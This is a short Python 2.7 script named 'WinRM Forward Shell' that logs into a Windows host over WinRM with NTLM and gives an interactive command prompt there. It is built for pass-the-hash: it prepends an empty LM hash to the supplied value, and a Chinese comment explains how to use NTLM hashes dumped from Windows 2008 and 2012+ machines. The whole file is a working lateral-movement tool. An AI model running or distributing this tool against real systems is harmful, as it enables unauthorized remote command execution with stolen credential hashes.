#! /usr/bin/env python2.7
# -*- coding:UTF-8 -*-

import winrm as pywinrm
import argparse


parse = argparse.ArgumentParser(description="WinRM Forward Shell")
parse.add_argument('-H', '--hostname', type=str, help="RHOST")
parse.add_argument('-u', '--username', type=str, help="USERNAME")
parse.add_argument('-p', '--password', type=str, help="PASSWORD",)
parse.add_argument('-d', '--domain', type=str, help="domain",)
args = parse.parse_args()

class Credentials:
    def __init__(self, username, password, domain):
        self.username = username
        self.password = password
        self.domain = domain
        if self.domain is None:
            self.domain = 'WORKGROUP'

class Connection:
    def __init__(self, hostname, credentials):
        self.hostname = hostname
        self.username = credentials.username
        self.password = credentials.password
        self.domain = credentials.domain

    def session(self, args):
        '''
         windows 2008上面是LM-HASH:NTLM-HASH的方式，需要修改源代码，去掉上面的一堆0加上冒号
         windows 2012以及之后只能抓到NTLM的Hash，直接使用即可
        :param args:
        :return:
        '''
        conn = pywinrm.Session(
            self.hostname,
            auth=('{}\\{}'.format(self.domain,self.username), '00000000000000000000000000000000:'+ self.password),
            transport='ntlm',
            server_cert_validation='ignore')
        try:
            r = conn.run_cmd(args)
            return (r.std_out).strip("\n")
        except Exception :
            pass

hostname = args.hostname
username = args.username
password = args.password
domain = args.domain

if not args.hostname:
    parse.print_help()
    exit()


print('Connecting to: ' + (hostname))
print(r'Using credentials: %s\%s:%s' % ((domain), (username), (password)))

try:
    credentials = Credentials(username, password, domain)
    connection = Connection(hostname, credentials)
    current =connection.session("whoami")
    # print('Current User: ' + current)
    while True:
        command = raw_input("cmd> ")
        if command == 'exit':
            exit()
        print connection.session(command)
except KeyboardInterrupt:
    pass
